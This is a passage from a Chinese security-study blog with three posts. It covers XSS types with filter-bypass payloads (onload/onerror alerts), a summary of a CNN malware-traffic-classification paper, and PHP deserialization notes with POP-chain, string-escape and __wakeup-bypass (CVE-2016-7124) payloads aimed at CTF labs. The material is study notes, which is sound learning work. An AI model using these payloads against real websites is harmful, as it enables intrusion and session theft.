<p>该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，<a target="_blank" rel="noopener" href="http://baike.baidu.com/item/%E9%AA%87%E5%AE%A2">骇客</a>将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。其攻击过程如下：</p>
<p>Bob拥有一个Web站点，该站点允许用户发布信息&#x2F;浏览已发布的信息。</p>
<p>Charly注意到Bob的站点具有类型C的XSS漏洞。</p>
<p>Charly发布一个热点信息，吸引其它用户纷纷阅读。</p>
<p>Bob或者是任何的其他人如Alice浏览该信息，其会话cookies或者其它信息将被Charly盗走。</p>
<p>类型A直接威胁用户个体，而类型B和类型C所威胁的对象都是企业级Web应用。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">反射型</span><br><span class="line">发包 x=qyw=&gt;x.php=&gt;回显</span><br><span class="line"></span><br><span class="line">存储型</span><br><span class="line">发包 x=qyw=&gt;x.php=&gt;写到数据库某个表=&gt;x.php=&gt;回显</span><br><span class="line"></span><br><span class="line">DOM型</span><br><span class="line">发包 x=qyw=&gt;本地浏览器静态前端代码=&gt;x.php=&gt;回显</span><br></pre></td></tr></table></figure>

<p>绕过<code>&lt;script&gt;</code>过滤</p>
<p>有的网站存在<code>&lt;script&gt;</code>过滤</p>
<p>在html中，onload关键字就是一个事件，其它的所有标签都没有这个属性，但是Body标签的有的。但是有一定的局限性，如果onload事件在你的代码之前已经被处理了，就不会触发了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>不过还有Onerror事件处理，图片没有指定也就是出错了，就会触发onerror事件，引发XSS漏洞，没有用<code>&lt;script&gt;</code>标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>cookie session 用户凭据，通过凭据可以判断对方的身份信息</p>
<p>cookie 存储在本地，存活事件较长 小中型</p>
<p>session 会话 存储在服务器，存活时间较短 大型</p>
<p>session更安全，但是会占用服务器的资源，且实现起来较为麻烦</p>
<p><strong>靶场实践</strong></p>
<p>反射型xss(get)</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f797d7c2-5734-4c14-9d28-b44d899531f4" alt="image"></p>
<p>存储型xss，每次刷新的时候都会弹窗</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/79034c3a-4c7d-4d47-b863-f6b908bbfbd7" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/26/Web-XSS1/" data-id="clrt05a9i00008wvf65sx1bby" data-title="XSS1-原理分类及攻击手法" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Paper-Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/25/Paper-Deep%20Learning%20Based%20Malware%20Traffic%20Classification%20for%20Power%20Internet%20of%20Things%20Network%20Security/" class="article-date">
  <time class="dt-published" datetime="2024-01-25T07:27:34.000Z" itemprop="datePublished">2024-01-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/25/Paper-Deep%20Learning%20Based%20Malware%20Traffic%20Classification%20for%20Power%20Internet%20of%20Things%20Network%20Security/">Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Deep-Learning-Based-Malware-Traffic-Classification-for-Power-Internet-of-Things-Network-Security-论文分享"><a href="#Deep-Learning-Based-Malware-Traffic-Classification-for-Power-Internet-of-Things-Network-Security-论文分享" class="headerlink" title="Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security 论文分享"></a>Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security 论文分享</h3><p>Tong YU, Xin LI, Ying LING, Dongmei BIN, and Chunyan YANG. 2022. Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security. In Proceedings of the 7th International Conference on Big Data and Computing (ICBDC ‘22). Association for Computing Machinery, New York, NY, USA, 131–137.</p>
<p>原文pdf链接：<a target="_blank" rel="noopener" href="https://dl-acm-org-s.otrust.ouc.edu.cn/doi/10.1145/3545801.3545820">https://dl-acm-org-s.otrust.ouc.edu.cn/doi/10.1145/3545801.3545820</a></p>
<p>基于深度学习的电力物联网网络安全恶意流量分类</p>
<p>这篇文章为电力物联网网络提出了一种新颖的基于深度学习的恶意软件流量分类方法，将流量以固定大小的字节序列的形式表示，并建立1D-CNN模型用于恶意软件流量检测和分类</p>
<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>在电力物联网中，大多数物联网设备资源有限，没有配备足够的安全保护方案，面临攻击者和恶意软件破坏安全的危险。对恶意软件流量分类是电力物联网网络安全的重要内容，可以支持入侵检测和防御等高级安全应用。</p>
<p>恶意软件流量分类方法可氛围三种，基于签名的方法、基于机器学习的方法和基于深度学习的方法。</p>
<p>本文提出一种基于1D-CNN模型的而已软件流量分类方案，主要有两步。第一步是网络流量处理，对原始网络流量进行捕捉并转换为固定长度的字节序列；第二步是模型训练，将以字节序列形式表示的流量输入1D-CNN模型进行训练。训练的模型由两种，一种是恶意软件流量监测模型，可以区分而已软件流量和良性应用流量，另一种是而已软件流量分类模型，可以识别特定的恶意软件流量类别。</p>
<h4 id="网络流量处理"><a href="#网络流量处理" class="headerlink" title="网络流量处理"></a>网络流量处理</h4><p>电力物联网恶意软件流量分类的对象是双向网络流量，单项网络流量是在一个实践间隔内网络中传输的网络数据包序列，这些数据包共享相同的5元组，其中包括原互联网协议地址、源端口、目的互联网协议地址、目的端口和传输协议，即TCP或UDP，双向流量是在两个断电之间双向穿越的单向流。</p>
<p>本文网络流量处理的目的是将电力物联网网络中收集到的网络流量转化为深度学习模型可以作为输入的标准IDX格式。</p>
<p>首先，以原始数据包跟踪的形式捕获网络流量，然后对原始网络数据包进行分析，重建网络流量，丢弃乱序数据包和重复数据包，其次将网络流量转换成统一的784字节大小，将流量中所有包含报头和有效载荷的数据包连起来，形成一个字节序列，以784字节大小进行分割，不足784字节的添加零位，最后将字节序列转换为深度学习常用的IDX格式。</p>
<p>为了实现流量可视化，将固定长度字节序列形成的流量转换为大小为28像素×28像素的灰度图像，图像中每个像素代表网络流量的一个字节，比如说下图，前10类是恶意流量，后10类是良性流量，每一类随机选择9个流量来代表该类别，可以看出每个类别中的流量图像在纹理上是一致的，不同类别的图像在纹理上有明显差异。</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ff2d3ba9-b6d3-4d5f-9a70-0db587bb15c4" alt="image"></p>
<h4 id="分类模式"><a href="#分类模式" class="headerlink" title="分类模式"></a>分类模式</h4><p>CNN被广泛应用于各种机器学习任务，本文采用近年来在自然语言处理中成功应用的1D-CNN模型。以784字节序列形式表示的网络流量作为输入，1D-CNN模型经过训练后可秩序恶意软件流量检测和恶意软件流量分类任务。为了从流量数据包之间的模式中发现隐藏特征，我们将流量经过三次卷积层和最大时间池化层，对于1D-CNN的第一层，应用大小为m×n的滤波器w，输出公式如下</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/851ac1f6-a66c-4e32-b019-ac191b85a29b" alt="image"></p>
<p>f(-)是一个非线性激活函数，本文使用的是ReLU函数。然后应用池化层。在完成3轮卷积层和max-over-time池化层后，通过4个完全连接层的soft-max函数获得流置信度最高的标签。1D-CNN模型各层的详细参数如下表所示。</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/877dd5ee-7859-48c5-b056-36886676b9a5" alt="image"></p>
<h4 id="评估"><a href="#评估" class="headerlink" title="评估"></a>评估</h4><p>数据集：USTC-TFC2016</p>
<p>数据集中有10类恶意软件流量，每一类约有六至八千个流量，还有10类良性应用流量，每类流量约有六至八千个流量，数据集的详细构成如下表。</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/336f4678-472c-482a-b9d2-24210f0b3970" alt="image"></p>
<p>将所提模型与LENET进行比较，LENET是最先进的恶意软件流量分类深度学习模型。评估指标为精确率，召回率和F1分数。下图为恶意软件流量检测的结果。可以看出，本文提出的1D-CNN模型能正确分类所有测试流量，总图准确率达到了100%，LENET模型的准确率也达到了99.9959%。</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/44e3de30-f477-437e-a37b-b02002e81b0d" alt="image"></p>
<p>下表是三个按类别度量的结果。可以看出1D-CNN模型在所有指标上以及在恶意软件和良性流量类别上都获得了100%的准确率，整体优于LENET模型。</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/31e0a929-9b96-4fee-9549-28922eac987f" alt="image"></p>
<h4 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h4><p>本文提出了一种基于1D-CNN模型的深度学习恶意软件流量分类方法，首先从原始网络数据包数据中提取固定大小的字节序列，然后对其进行分类，将序列输入1D-CNN模型来训练分类器，在公共数据集上进行实验，得出所提出的方法在总体准确率和每类指标方面都优于现有的最先进模型。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/25/Paper-Deep%20Learning%20Based%20Malware%20Traffic%20Classification%20for%20Power%20Internet%20of%20Things%20Network%20Security/" data-id="clrsw6xuu0000g4vf5k8ohs3m" data-title="Deep Learning Based Malware Traffic Classification for Power Internet of Things Network Security" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-PHP" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/01/24/PHP/" class="article-date">
  <time class="dt-published" datetime="2024-01-24T14:04:16.000Z" itemprop="datePublished">2024-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/01/24/PHP/">PHP</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="php变量规则"><a href="#php变量规则" class="headerlink" title="php变量规则"></a>php变量规则</h1><p>变量以$开始，后面跟着变量名称（不用声明变量类型）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$text</span>=<span class="string">&quot;helloworld&quot;</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>变量类型</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">local</span><br><span class="line">global 函数内访问全局变量</span><br><span class="line">static 函数完成时，它的所有变量通常会删除，希望某个局部变量不被删除，就使用static关键字声明</span><br></pre></td></tr></table></figure>

<p>输出 echo</p>
<p>输出变量</p>
<p>$txt1&#x3D;”学习 PHP”;</p>
<p>$cars&#x3D;array(“Volvo”,”BMW”,”Toyota”);</p>
<p>echo $txt1;</p>
<p>echo “&lt; br &gt;” 换行 </p>
<p>echo “我车的品牌是 {$cars[0]}”;</p>
<p>输出print 和echo使用方法一样</p>
<p>PHP反序列化</p>
<p>public protected 子类可用</p>
<p>private 子类不可用</p>
<h1 id="php序列化"><a href="#php序列化" class="headerlink" title="php序列化"></a>php序列化</h1><p>序列化的作用</p>
<p>序列化是将对象的状态信息（属性）转换为可以存储或传输形式的过程</p>
<p>对象 序列化为 字符串</p>
<p>将对象或数组转化为可存储&#x2F;传输的字符串</p>
<p>在php中使用函数serialize()来将对象或者数组进行序列化，并返回一个包含字节流的字符串来表示</p>
<p>表达方式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出为N;</p>
<p>对象的序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$pub</span>=<span class="string">&quot;benben&quot;</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>不能序列化类，可以序列化对象，输出为：</p>
<p><code>O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;</code></p>
<p><code>O(object):4(类名长度):&quot;test&quot;(类名):1(变量数量):&#123;s:3(变量名字长度):&quot;pub&quot;(变量名字);s:6(值的长度):&quot;benben&quot;(变量值);&#125;</code></p>
<p>private私有属性序列化时，在变量名前加”%00类名%00”，但是直接看看不见</p>
<p>要先加上这个，再对私有属性进行反序列化</p>
<h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><p>反序列化的特性</p>
<p>1、反序列化之后的内容为一个对象</p>
<p>2、反序列化生成的对象里的值，由反序列化里的值提供，与原有类预定义的值无关</p>
<p>3、反序列化不触发类的成员方法，需要调用方法后才能触发</p>
<p>[3 先反序列化，再调用类里面的成员方法，类不能被注释，否则找不到成员方法]</p>
<p>反序列化 unserialize</p>
<p>反序列化就是将序列化后的参数还原成实例化的对象</p>
<p>序列化  serialize</p>
<p>反序列化漏洞的成因：反序列化过程中，unserialize()接收的值（字符串）可控；通过更改这个值（字符串），得到所需要的代码，即生成的对象的属性值</p>
<p>通过调用方法，出发代码执行</p>
<p>eval()执行代码</p>
<h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p>魔术方法是一个预定义好的，在特定情况下自动触发的行为方法</p>
<p>魔术方法的作用</p>
<p>反序列化漏洞成因：反序列化过程中，unserialize()接收的值（字符串）可控，通过更改这个值（字符串）得到所需要的代码，通过调用方法，出发代码执行</p>
<p>魔术方法在特定条件下自动调用相关方法，最终导致触发代码</p>
<p>魔术方法触发时机，参数，返回值</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ac512080-8094-4f8e-91bf-a4967df8ada4" alt="image"></p>
<h2 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h2><p><strong>__construct()</strong> 构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法</p>
<p>触发时机：实例化对象</p>
<p>功能：提前清理不必要内容</p>
<p>参数：非必要</p>
<p>返回值</p>
<p>在序列化和反序列化过程中不会被触发</p>
<h2 id="distruct"><a href="#distruct" class="headerlink" title="__distruct()"></a>__distruct()</h2><p><strong>__distruct()</strong> 析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法</p>
<p>实例化对象结束后，代码运行完会销毁，触发构造函数__destruct()</p>
<p>触发时机：对象引用完成，或对象被摧毁</p>
<p>功能：</p>
<p>参数：</p>
<p>返回值</p>
<p>在序列化过程中不会被触发</p>
<p>在反序列化过程中会触发，反序列化得到的是对象，用完后会销毁，触发析构函数__distruct()</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/a4b6409a-6b95-4a39-8f26-7e5078d66760" alt="image"></p>
<h2 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h2><p><strong>__sleep()</strong> 序列化serialize()函数会检查类中是否存在一个魔术方法__sleep()，如果存在，该方法会现被调用，然后才执行序列化操作，此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组，如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误</p>
<p>触发时机：序列化serialize()之前</p>
<p>功能：对象被序列化之前触发，返沪需要被序列化存储的成员属性，删除不必要的属性</p>
<p>参数：成员属性</p>
<p>返回值：需要被序列化存储的成员属性</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ac24a1bf-aa25-4408-81f9-5e493226c41a" alt="image"></p>
<p>__sleep执行返回需要序列化的变量名，过滤掉password变量</p>
<p>serialize()只序列化sleep返回的变量</p>
<h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h2><p><strong>__wakeup()</strong> unserialize()会检查是否存在一个__wakeup()方法，如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源。</p>
<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作</p>
<p>触发时机：反序列化unserialize()之前</p>
<p>功能：</p>
<p>参数：</p>
<p>返回值：</p>
<p>__wakeup()在反序列化unserialize()之前</p>
<p>__destruct()在反序列化unserialize()之后</p>
<p>有的题要绕开它们，避免值被改变</p>
<h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h2><p><strong>__toString()</strong> 表达方式错误导致魔术方法触发</p>
<p>触发时机：把对象当成字符串调用</p>
<p>功能：</p>
<p>参数：</p>
<p>返回值：</p>
<p>把类User实体化并赋值给$test，此时$test是个对象，调用对象可以使用print_r或者var_dump</p>
<p>如果使用echo或者print只能调用字符串的方式去调用对象，即把对象当成字符串使用，此时自动触发toString()</p>
<h2 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h2><p><strong>__invoke()</strong> 表达方式错误导致魔术方法触发</p>
<p>触发时机：把对象当成函数调用</p>
<p>功能：</p>
<p>参数：</p>
<p>返回值：</p>
<p>把类User实体化并赋值给$test，此时$test是个对象，调用对象可以使用print_r或者var_dump</p>
<p>加()是把test当成函数test()来调用，此时触发invoke()</p>
<p>$test()</p>
<h2 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h2><p><strong>__call()</strong> </p>
<p>触发时机：调用一个不存在的方法</p>
<p>功能：</p>
<p>参数：2个参数传参$arg1,$arg2（参数个数与定义的__call()函数相对应）</p>
<p>返回值：调用的不存在的方法的名称和参数</p>
<p>调用的方法不存在，触发魔术方法__call()</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1620df34-063d-47b4-bd90-4e8dee8f2d4a" alt="image"></p>
<h2 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h2><p><strong>__callStatic()</strong> </p>
<p>触发时机：静态调用或调用成员常量时使用的方法不存在</p>
<p>功能：</p>
<p>参数：2个参数传参$arg1,$arg2（参数个数与定义的__callStatic()函数相对应）</p>
<p>返回值：调用的不存在的方法的名称和参数</p>
<p>调用的方法不存在，触发魔术方法callStatic()</p>
<p>静态调用 $test :: callxxx(‘a’)</p>
<p>非静态调用 $test -&gt; callxxx(‘a’)</p>
<h2 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h2><p><strong>__get()</strong> </p>
<p>触发时机：调用的成员属性不存在</p>
<p>功能：</p>
<p>参数：传参$arg1</p>
<p>返回值：不存在的成员属性的名称</p>
<p>var2不存在</p>
<p>$test -&gt; var2;</p>
<p>__get($arg1)</p>
<p>把var2赋值给$arg1</p>
<p>最后输出var2</p>
<h2 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h2><p><strong>__set()</strong> </p>
<p>触发时机：给不存在的成员赋值属性</p>
<p>功能：</p>
<p>参数：传参$arg1,$arg2</p>
<p>返回值：不存在的成员属性的名称和赋的值</p>
<h2 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h2><p><strong>__isset()</strong> </p>
<p>触发时机：对不可访问属性使用isset()或empty()时，__isset()会被调用</p>
<p>功能：</p>
<p>参数：传参$arg1</p>
<p>返回值：不存在或不可访问的成员属性的名称</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f77d9eb7-790b-4a2b-a9e5-7ce6ac2c78ae" alt="image"></p>
<h2 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h2><p><strong>__unset()</strong> </p>
<p>触发时机：对不可访问属性使用unset()时</p>
<p>功能：</p>
<p>参数：传参$arg1</p>
<p>返回值：不存在的成员属性的名称</p>
<h2 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h2><p><strong>__clone()</strong> </p>
<p>触发时机：当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</p>
<p>功能：</p>
<p>参数：</p>
<p>返回值：</p>
<h2 id="魔术方法总结"><a href="#魔术方法总结" class="headerlink" title="魔术方法总结"></a>魔术方法总结</h2><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/a5f1cfa7-8a39-4006-9da5-e88d05037ac6" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1d20ae88-8cf7-445d-b8b8-9ee1fe9cbf57" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/87ebba2f-9a57-438b-b175-9a05684e6fd5" alt="image"></p>
<h1 id="POP链构造，POC编写"><a href="#POP链构造，POC编写" class="headerlink" title="POP链构造，POC编写"></a>POP链构造，POC编写</h1><p><strong>POP链</strong></p>
<p>在反序列化中，我们能控制的数据就是对象中的属性值（成员变量），所以在PHP反序列化中有一种漏洞利用的方法叫”面向属性编程“，即POP</p>
<p>POP链就是利用魔法方法在里面进行多次跳转然后获取敏感数据的一种payload</p>
<p><strong>POC编写</strong></p>
<p>POC中文译作概念验证，在安全界可以理解成漏洞验证程序，POC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码</p>
<p>编写一段不完整的程序，获取所需要的序列化字符串</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/664dfe0f-e131-4c81-bce1-8b586adaa113" alt="image"></p>
<p>要触发Modifier的append得到flag，value&#x3D;flag.php</p>
<p>要触发Modifier的__invoke()  把对象当成函数调用</p>
<p>触发Test的__get()  给不存在的成员属性赋值，p赋值为Modifier对象，就能return对象</p>
<p>然后触发get，给不存在的成员属性赋值，给Show中的$str赋值为Test属性，</p>
<p>然后需要触发__wakeup，反序列化之前，在wakeuo中，让source为Show对象，一定要是Show的对象，否则无法触发tostring</p>
<p>再把对象当字符串用，就能触发tostring</p>
<h1 id="字符串逃逸基础-字符减少"><a href="#字符串逃逸基础-字符减少" class="headerlink" title="字符串逃逸基础_字符减少"></a>字符串逃逸基础_字符减少</h1><p>反序列化分隔符</p>
<p>反序列化以;}结束，后面的字符串不影响正常的反序列化</p>
<p>属性逃逸</p>
<p>一般在数据先经过一次serialize再经过unserialize，再这个中间反序列化的字符串变多或者变少的时候有可能存在反序列化属性逃逸</p>
<p>构造值，让倒数第二个“及之前的功能性代码变为值，则后面的值变成功能性代码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/34903358-33f5-461a-a413-eea3b32c0dc9" alt="image"></p>
<p>反序列化字符串逃逸：多套一处一个成员属性，第一个字符串减少，吃掉有效代码，在第二个字符串构造代码</p>
<h1 id="字符串逃逸基础-字符减增多"><a href="#字符串逃逸基础-字符减增多" class="headerlink" title="字符串逃逸基础_字符减增多"></a>字符串逃逸基础_字符减增多</h1><p>反序列化字符串减少逃逸：多逃逸出一个成员属性，第一个字符串减少，吃掉有效代码，在第二个字符串构造带吗</p>
<p>反序列化字符串增多逃逸：构造出一个逃逸成员属性，第一个字符串增多，吐出多余代码，把多余位代码构造成逃逸的成员属性</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b6508253-d62e-4cd4-a60d-b5e830250f9b" alt="image"></p>
<p>第一个字符串增多，吐出多余代码，把多余代码构造成逃逸成员属性</p>
<p><strong>字符串逃逸增多，例题思考</strong></p>
<p>profile是test对象，且pass值为escaping</p>
<p>把$name中的$safe替换为hack</p>
<p>__construct()实例化对象时会触发</p>
<p>实例化test对象时会触发__construct，把$param的值赋给test对象的user</p>
<p>然后反序列化时，会把$param中的flag和php都转为hack</p>
<p>要改变pass的值，但是分析一遍过后发现没有对pass进行更改，因此利用filter中将php替换为hack，字符串逃逸，字符增多，把有效代码往外吐</p>
<p>“;s:4:”pass”;s:8:”escaping”;}</p>
<p>要吐出29个</p>
<p>所以要29个php替换为hack</p>
<p><strong>字符串逃逸减少，例题思考</strong></p>
<p>要让$profile-&gt;vip为true，才能输出flag</p>
<p>题目要获取user和pass</p>
<p>param为user</p>
<p>user和pass的值为test类的user和pass值</p>
<p>filter是把flag和php替换为hk</p>
<p>字符串减少，把后面的包进来</p>
<p>要变成功能性代码的</p>
<p>s:4:”user”;s:?:”fff”;s:4:”pass”;s:25:”1”;<strong>s:3:”vip”;s:4:”true”;}</strong>“</p>
<p>前面要包住20个，flag包2，php包1</p>
<p>10个flag</p>
<p>?user&#x3D;flagflagflagflagflagflagflagflagflagflag &amp;pass&#x3D;1”;s:3:”vip”;b:1;}</p>
<p>O:4:”test”:3:{s:4:”user”;s:4:”flag”;s:4:”pass”;s:6:”benben”;s:3:”vip”;b:1;}</p>
<h1 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h1><p>反序列化漏洞：CVE-2016-7124</p>
<p>漏洞产生原因：如果存在__wakeup方法，调用unserilize()方法之前</p>
<p>会先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时</p>
<p>会跳过__wakeup()的执行</p>
<p>把成员属性数量+1，就能绕过__wakeup()</p>
<p>如果题目中正则表达式，不允许O后面跟数字，就写成O:+6</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/[oc]:\d+:/i&#x27;</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<p>$a &#x3D; ‘O:+6:”secret”:2:{s:4:”file”;s:8:”flag.php”;}’;</p>
<p>echo urlencode($a);</p>
<p>记得最后要urlencode一下</p>
<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>符号&amp;</p>
<p>$a-&gt;enter&#x3D;&amp;$a-&gt;secret</p>
<p>保证$a-&gt;enter的值和$a-&gt;secret的值一直一样</p>
<h1 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h1><p>当session_strat()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为&#x2F;tmp）</p>
<p>存取数据的格式有多种，常用的由三种</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d66a2d5a-cef5-403c-8f53-509e07146229" alt="image"></p>
<p>漏洞产生：写入格式和读取格式不一样  </p>
<p>当网站序列化并存储session，与反序列化并读取session的方式不同，就可能导致session反序列化漏洞的产生。</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/034b1373-ca69-4b5c-9212-8488505fcc51" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/34ca214d-e437-4039-8876-cf507964ecbc" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/24/PHP/" data-id="clrrksg850000ewvf6jzg0n81" data-title="PHP" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
